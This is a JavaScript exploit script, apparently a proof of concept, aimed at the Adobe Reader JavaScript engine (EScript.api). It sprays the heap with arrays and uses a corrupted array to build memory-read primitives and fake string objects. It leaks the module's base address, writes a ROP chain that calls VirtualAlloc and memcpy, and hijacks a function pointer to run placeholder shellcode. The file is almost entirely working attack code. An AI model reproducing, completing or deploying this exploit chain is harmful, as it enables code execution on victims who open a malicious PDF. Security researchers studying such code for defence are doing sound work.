console.show();

array = new Array();
for(i=0; i<=200000; i++) {
	array[i] = new Array(0xa);

	/* values in hexa will be 0x13371337deadc0de */
	array[i][0] = 4.18356164518379836e-216;
	array[i][1] = 4.18356164518379836e-216;
	array[i][2] = 4.18356164518379836e-216;
	array[i][3] = 4.18356164518379836e-216;
	array[i][4] = 4.18356164518379836e-216;
	array[i][5] = 4.18356164518379836e-216;
	array[i][6] = 4.18356164518379836e-216;
	array[i][7] = 4.18356164518379836e-216;
	array[i][8] = 4.18356164518379836e-216;
	array[i][9] = 4.18356164518379836e-216;
}

var fpu = {
	float: function (high, low) {
		var signed;
		var exponent;
		var fraction;
		var i;

		signed   = (high & 0x80000000) >> 31;
		exponent = (high & 0x7ff00000) >> 20;

		fraction = 0;
	
		for(i = 0; i < 32; i++) {
			fraction += ((low >> i) & 0x1) * Math.pow(2,-(52-i));
		}
	
		for(i = 0; i < 20; i++) {
			fraction += ((high >> i) & 0x1) * Math.pow(2,-(20-i));
		}

		return Math.pow(-1, signed) * (1 + fraction) * Math.pow(2, exponent-1023);
	},

	hex: function (n) {
		var exp;
		var mantissa;
		var approach;
		var i;
		var x1;
		var x2;
		var high;
		var low;

		exp = 0;
		while(n < 1 || n > 2) {
			if(n < 1) {
				n *= 2;
				exp--;
			} else {
				n *= 0.5;
				exp++;
			}
		}
		mantissa = n-1;

		i = 0;
		x1 = 0;
		x2 = 0;
		approach = 0;
		while(mantissa-approach >= Math.pow(2, -52)) {
			if(mantissa >= approach + Math.pow(2, -i)) {
				approach += Math.pow(2, -i);

				if(i > 20) {
					x2 |= Math.pow(2, 52-i);
				} else {
					x1 |= Math.pow(2, 20-i);
				}
			}
			i++;
		}

		high = x2<0?0xffffffff+1+x2:x2;
		low  = (exp+1023) << 20;
		low |= x1<0?0xffffffff+1+x1:x1;
	
		if (n < 0) {
			high |= 0x80000000;
		}

		return [high, low];
	}
}


function Primitives(evilarr, index) {
	this.evilarr = evilarr;
	this.index = index;
	this.bufptr = 0;
	
	JSVAL_TAG_CLEAR = 0xFFFFFF80;
	JSVAL_TYPE_STRING = JSVAL_TAG_CLEAR | 0x5;
	JSVAL_TYPE_OBJECT = JSVAL_TAG_CLEAR | 0x7;

	this.bufaddr = function () {
		this.bufptr = fpu.hex(this.evilarr[this.index][11])[1];
		return this.bufptr;
	}

	/*
	take unaligned objects incrementing the bufptr
	@offset: increment of the pointer.
	@return: the new address.
	*/
	this.offset_buf = function (offset) {
		this.evilarr[this.index][11] = fpu.float(this.bufptr+offset, 0x00);
		return fpu.hex(this.evilarr[this.index][11]);
	}

	/* create a fake string object at the 30 item */
	this.create_fakestr = function(ptr, size) {
		/* fake object */		
		this.evilarr[this.index][30] = fpu.float(ptr, (size << 0x3 | 0x4));

		/* pointer and type */
		this.evilarr[this.index][15] = fpu.float(this.bufptr+(30*4), 0xa);
		this.evilarr[this.index][16] = fpu.float(0x33333333, JSVAL_TYPE_STRING);
	}

	this.read = function (ptr, size) {
		this.create_fakestr(ptr, size);
		return this.evilarr[this.index+1][0];
	}

	this.read_dword = function (addr) {
		value = this.read(addr, 4);
		return (value.charCodeAt(1) << 16 | value.charCodeAt(0));
	}

	/* copy an object to string, modify the function pointer, finally change it to object */
	this.create_fake_object = function (ptrobj, fp) {
		buf = this.read(ptrobj, 0x24);
		
		fp_utf8 = escape(String.fromCharCode(gadget & 0xffff, gadget >> 16));

		this.evilarr[this.index+1][8] = buf.slice(0, 0x1c>>1) + unescape(fp_utf8) + buf.slice(0x20>>1, 0x24>>1);
		console.println("[+] evil buffer: " + escape(this.evilarr[this.index+1][8]));
		
		fake_object = this.read_dword(fpu.hex(this.evilarr[this.index][23])[1]+4);
		
		console.println(fake_object.toString(16));
		this.evilarr[this.index][23] = fpu.float(fake_object, 0x33333333);
		this.evilarr[this.index][24] = fpu.float(0x33333333, JSVAL_TYPE_OBJECT);

		/* this.evilarr[this.index+1][8](); */
	}

}

function DoIt() {

	/* found modified array */
	for(i=0; i<array.length; i++) {
		if(array[i].length != 0xa) {
			console.println("[+] index crafted: " + i);
			app.clearInterval(timeout);

			p = new Primitives(array, i);
			
			buf = p.bufaddr();
			console.println("[*] buf address: 0x" + buf.toString(16));
		
			p.offset_buf(4);
			
			/* an address of EScript.api is going to be leaked */
			array[i+1][3] = app.alert;
			ptr = fpu.hex(array[i][18])[1];
			console.println("[*] app.alert object at: 0x" + ptr.toString(16));
	
			baseaddr = p.read_dword(ptr+0x1c);
			while(p.read(baseaddr & 0xffff0000, 2).charCodeAt(0) != 0x5a4d)
				baseaddr -= 0x10000;
			baseaddr &= 0xffff0000;

			console.println("[*] base address of EScript.api: 0x" + baseaddr.toString(16));

			/* sobrescribe punteros doblemente apuntados por .data */
			ropchain_addr = p.read_dword(baseaddr + 0x259cf8);
			console.println("[+] ropchain was written at: 0x" + ropchain_addr.toString(16));
			
			console.println("[+] finding possible header");

			for(k=4; !(p.read_dword(ropchain_addr - k) <= 0x1000 && p.read_dword(ropchain_addr - k) >= 0x100); k+=4);
			arr_head = p.read_dword(ropchain_addr - k);
			console.println("[*] 0x" + arr_head.toString(16) + " found it at 0x" + (ropchain_addr - k).toString(16));

			/* mato el tercer pointer a buf para apuntar a la zona anterior */
			array[i][41] = fpu.float((ropchain_addr - k + 0xc), 0x00);
			console.println("[+] writing pivot xchg eax,esp");

			adjusment = baseaddr + 0x73c1;	/* add esp,0x10 - ret */
			pivot = baseaddr + 0x13f8c2;	/* xchg eax,esp - ret */

			/* calculando indices */
			if((k-0xc) % 8 == 4) {
				shellcode = unescape("%u4141%u4242%u4343%u4444%u4545%u4646");
				array[i+1][2] = shellcode;
				ptr_shellcode = p.read_dword(fpu.hex(array[i][17])[1] + 4);
				
				array[i+3][((k-0x10)/8)] = fpu.float(adjusment, 0x6a7e6e6b);

				/* ret %% pop ecx */
				array[i+3][((k-0x10)/8)+3] = fpu.float(baseaddr + 0x100a, baseaddr + 0x7230);
				/* argv[1] of VirtualAlloc %%  pop eax */
				array[i+3][((k-0x10)/8)+4] = fpu.float(baseaddr + 0x128cc, ropchain_addr + 0x94);
				/* -1 %% inc eax */ 
				array[i+3][((k-0x10)/8)+5] = fpu.float(baseaddr + 0x30ba, 0xffffffff);
				/* mov [ecx],eax %% pop ecx */
				array[i+3][((k-0x10)/8)+6] = fpu.float(baseaddr + 0x100a, baseaddr + 0x6ac0c);
				/* argv[2] of VirtualAlloc %% pop eax */
				array[i+3][((k-0x10)/8)+7] = fpu.float(baseaddr + 0x128cc, ropchain_addr+0x98);
				/* 0xfffff000 (~0x1000) %% neg eax */
				array[i+3][((k-0x10)/8)+8] = fpu.float(baseaddr + 0x14ca3b, 0xfffff000);
				/* mov [ecx],eax %% pop ecx */
				array[i+3][((k-0x10)/8)+9] = fpu.float(baseaddr + 0x100a, baseaddr + 0x6ac0c);
				/* argv[3] of VirtualAlloc %% mov [ecx],eax */
				array[i+3][((k-0x10)/8)+10] = fpu.float(baseaddr + 0x6ac0c, ropchain_addr + 0x9c);
				/* pop ecx %% argv[4] of VirtualAlloc */
				array[i+3][((k-0x10)/8)+11] = fpu.float(ropchain_addr + 0xa0, baseaddr + 0x100a);
				/* add esp,0x0c */
				array[i+3][((k-0x10)/8)+12] = fpu.float(0x41414141, baseaddr + 0x722d);
				array[i+3][((k-0x10)/8)+13] = fpu.float(0x41414141, pivot);
				/* ret %% pop eax */
				array[i+3][((k-0x10)/8)+14] = fpu.float(baseaddr + 0x128cc, baseaddr + 0x100b);
				/* 0xffffffc0 (~0x40) %% neg eax */
				array[i+3][((k-0x10)/8)+15] = fpu.float(baseaddr + 0x14ca3b, 0xffffffc0);
				/* mov [ecx],eax %% pop eax */
				array[i+3][((k-0x10)/8)+16] = fpu.float(baseaddr + 0x128cc, baseaddr + 0x6ac0c);
				/* VirtualAlloc IAT entry %% mov eax,[eax] */
				array[i+3][((k-0x10)/8)+17] = fpu.float(baseaddr + 0x24253, baseaddr + 0x197084);
				/* jmp eax %% pop ecx */
				array[i+3][((k-0x10)/8)+18] = fpu.float(baseaddr + 0x100a, baseaddr + 0x47093);
				array[i+3][((k-0x10)/8)+19] = fpu.float(0x55555555, 0x55555555);
				array[i+3][((k-0x10)/8)+20] = fpu.float(0x66666666, 0x66666666);
				/* return address of memcpy %% mov [ecx],eax */
				array[i+3][((k-0x10)/8)+21] = fpu.float(baseaddr + 0x6ac0c, ropchain_addr + 0xc8);
				/* pop ecx %% argv[1] of memcpy */
				array[i+3][((k-0x10)/8)+22] = fpu.float(ropchain_addr + 0xcc, baseaddr + 0x100a);
				/* mov [ecx],eax %% pop eax */
				array[i+3][((k-0x10)/8)+23] = fpu.float(baseaddr + 0x128cc, baseaddr + 0x6ac0c);
				/* memcpy IAT entry %% mov eax,[eax] */
				array[i+3][((k-0x10)/8)+24] = fpu.float(baseaddr + 0x24253, baseaddr + 0x1971c4);
				/* jmp eax */
				array[i+3][((k-0x10)/8)+25] = fpu.float(0x55555555, baseaddr + 0x47093);
				array[i+3][((k-0x10)/8)+26] = fpu.float(ptr_shellcode, 0x55555555);
				array[i+3][((k-0x10)/8)+27] = fpu.float(0x41414141, shellcode.length * 2);
			} else { /* (k-0xc) % 8 == 4 */
				app.alert("[-] Not implemented");
			}
			
			gadget = baseaddr + 0x59a7			/* mov eax,[62128db8] - call [eax+64] */
			p.create_fake_object(ptr, gadget);
			array[i+1][8]("pwned!"); /* calling fake object */

			break;
		}
	}
}

timeout = app.setInterval("DoIt()", 7000)
timeout.count = 0;
